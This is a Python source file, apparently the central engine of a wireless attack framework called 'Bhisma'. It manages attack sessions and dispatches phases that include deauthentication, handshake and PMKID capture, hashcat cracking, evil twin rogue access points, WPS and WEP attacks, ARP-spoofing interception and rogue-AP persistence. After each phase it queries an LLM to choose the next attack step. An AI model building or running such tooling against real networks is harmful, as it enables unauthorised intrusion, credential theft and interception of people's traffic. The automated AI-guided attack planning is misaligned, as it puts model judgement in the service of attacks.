"""
Main Orchestrator Engine
========================
Central controller that coordinates all Bhisma modules.
"""

import time
from typing import Dict, Any, Optional, List
from dataclasses import dataclass, field

from rich.console import Console

from bhisma.core.config import BhismaConfig
from bhisma.core.state_machine import AttackStateMachine, AttackPhase
from bhisma.brain.orchestrator import LLMOrchestrator

console = Console()


@dataclass
class AttackSession:
    """Tracks a single attack session."""
    session_id: str
    target_bssid: str
    target_ssid: str = ""
    start_time: float = field(default_factory=time.time)
    phases_completed: List[str] = field(default_factory=list)
    phases_failed: List[str] = field(default_factory=list)
    current_phase: str = "idle"
    credentials_found: List[Dict] = field(default_factory=list)
    captures: List[str] = field(default_factory=list)
    ai_decisions: List[Dict] = field(default_factory=list)


class BhismaEngine:
    """Main orchestrator for the Bhisma framework."""

    def __init__(self, config: Optional[BhismaConfig] = None):
        self.config = config or BhismaConfig.load()
        self.state_machine = AttackStateMachine()
        self.ai = LLMOrchestrator(self.config)
        self.sessions: Dict[str, AttackSession] = {}
        self._current_session: Optional[AttackSession] = None

    def start_session(self, target: Dict[str, Any]) -> AttackSession:
        """Initialize a new attack session."""
        import uuid
        session = AttackSession(
            session_id=str(uuid.uuid4())[:8],
            target_bssid=target.get("bssid", "unknown"),
            target_ssid=target.get("ssid", ""),
        )
        self.sessions[session.session_id] = session
        self._current_session = session
        console.print(f"[bold cyan][*] Session {session.session_id} started for {session.target_ssid or session.target_bssid}[/bold cyan]")
        return session

    def end_session(self, session_id: Optional[str] = None) -> None:
        """End an attack session."""
        sid = session_id or (self._current_session.session_id if self._current_session else None)
        if sid and sid in self.sessions:
            session = self.sessions[sid]
            elapsed = time.time() - session.start_time
            console.print(f"[bold green][+] Session {sid} ended. Duration: {elapsed:.1f}s[/bold green]")
            self._current_session = None

    def execute_phase(
        self,
        phase_name: str,
        target: Dict[str, Any],
        iface: str,
        params: Optional[Dict[str, Any]] = None,
    ) -> Dict[str, Any]:
        """
        Execute a single attack phase.

        Args:
            phase_name: Name of the phase (recon, deauth, harvest, crack, mitm, etc.)
            target: Target AP dict
            iface: Monitor mode interface
            params: Phase-specific parameters

        Returns:
            Result dict with status, output, and next recommendation
        """
        session = self._current_session
        if session:
            session.current_phase = phase_name

        console.print(f"[bold magenta][PHASE] {phase_name.upper()}[/bold magenta]")

        # Broadcast phase start to dashboard
        self._broadcast_timeline(phase_name, "started", "")

        result = {"phase": phase_name, "status": "failure", "output": "", "recommendation": ""}

        try:
            if phase_name == "recon":
                result = self._phase_recon(target, iface, params)
            elif phase_name == "deauth":
                result = self._phase_deauth(target, iface, params)
            elif phase_name == "harvest":
                result = self._phase_harvest(target, iface, params)
            elif phase_name == "crack":
                result = self._phase_crack(target, iface, params)
            elif phase_name == "evil_twin":
                result = self._phase_evil_twin(target, iface, params)
            elif phase_name == "wps":
                result = self._phase_wps(target, iface, params)
            elif phase_name == "wep":
                result = self._phase_wep(target, iface, params)
            elif phase_name == "mitm":
                result = self._phase_mitm(target, iface, params)
            elif phase_name == "persist":
                result = self._phase_persist(target, iface, params)
            else:
                result["status"] = "unknown"
                result["output"] = f"Unknown phase: {phase_name}"
        except Exception as e:
            result["status"] = "error"
            result["output"] = str(e)
            console.print(f"[bold red][!] Phase {phase_name} error: {e}[/bold red]")

        if session:
            if result["status"] == "success":
                session.phases_completed.append(phase_name)
            else:
                session.phases_failed.append(phase_name)

        # Broadcast phase result to dashboard
        self._broadcast_timeline(phase_name, result["status"], result.get("output", "")[:200])

        # AI analysis of phase result
        try:
            ai_rec = self.ai.query(
                f"Phase '{phase_name}' completed with status: {result['status']}. "
                f"Output: {result.get('output', '')[:500]}. "
                f"What should be the next phase? Target: {target}",
                max_tokens=100,
                temperature=0.2,
            )
            result["ai_recommendation"] = ai_rec.text.strip()
        except Exception:
            result["ai_recommendation"] = ""

        return result

    def _broadcast_timeline(self, phase: str, status: str, result: str) -> None:
        """Broadcast phase event to dashboard."""
        try:
            from bhisma.dashboard.websocket import DashboardWebsocket
            DashboardWebsocket.broadcast({
                "type": "timeline",
                "data": {
                    "phase": phase,
                    "status": status,
                    "result": result,
                }
            })
        except Exception:
            pass

    def _phase_recon(self, target, iface, params):
        from bhisma.wifi.recon import ReconManager
        recon = ReconManager(iface, self.config)
        results = recon.passive_recon(duration=params.get("duration", 30))
        return {"status": "success", "output": f"Found {len(results['aps'])} APs, {len(results['clients'])} clients", "data": results}

    def _phase_deauth(self, target, iface, params):
        from bhisma.wifi.deauth import DeauthManager
        mgr = DeauthManager(iface, self.config)
        silent = params.get("silent", self.config.wifi.silent_deauth_enabled)
        client = params.get("client")
        if silent:
            mgr.silent_pulse_deauth(target["bssid"], client)
        else:
            mgr.directed_deauth(target["bssid"], client, count=params.get("count", 3))
        return {"status": "success", "output": "Deauth packets sent"}

    def _phase_harvest(self, target, iface, params):
        from bhisma.wifi.harvester import HarvesterManager
        mgr = HarvesterManager(iface, self.config)
        result = mgr.capture(
            target["bssid"],
            pmkid=params.get("pmkid", True),
            handshake=params.get("handshake", True),
            output=params.get("output"),
        )
        return {"status": "success" if result.get("captured") else "failure", "output": result}

    def _phase_crack(self, target, iface, params):
        from bhisma.wifi.harvester import CrackManager
        mgr = CrackManager()
        hash_file = params.get("hash_file")
        if not hash_file:
            return {"status": "failure", "output": "No hash file provided"}
        result = mgr.crack(hash_file, wordlist=params.get("wordlist"), use_hashcat=params.get("hashcat", True))
        return {"status": "success" if result.get("cracked") else "failure", "output": result}

    def _phase_evil_twin(self, target, iface, params):
        from bhisma.wifi.evil_twin import EvilTwinManager
        mgr = EvilTwinManager(iface, self.config)
        mgr.start_rogue_ap(
            target_bssid=target["bssid"],
            portal=params.get("portal", True),
            karma=params.get("karma", False),
            mana=params.get("mana", False),
        )
        return {"status": "success", "output": "Evil Twin AP started"}

    def _phase_wps(self, target, iface, params):
        from bhisma.wifi.wps import WPSAttacker
        mgr = WPSAttacker(iface)
        if params.get("pixie"):
            mgr.pixie_dust(target["bssid"], timeout=params.get("timeout", 120))
        else:
            mgr.auto_attack(target["bssid"], timeout=params.get("timeout", 600))
        return {"status": "partial", "output": "WPS attack initiated"}

    def _phase_wep(self, target, iface, params):
        from bhisma.wifi.wep import WEPCracker
        mgr = WEPCracker(iface)
        mgr.attack(target["bssid"])
        return {"status": "partial", "output": "WEP attack initiated"}

    def _phase_mitm(self, target, iface, params):
        from bhisma.mitm.arp import ARPSpoofer
        spoofer = ARPSpoofer(iface)
        spoofer.start(target["bssid"])
        return {"status": "success", "output": "MITM started"}

    def _phase_persist(self, target, iface, params):
        from bhisma.persistence.rogue_ap import RogueAPManager
        mgr = RogueAPManager(iface, self.config)
        mgr.deploy()
        return {"status": "success", "output": "Persistence established"}
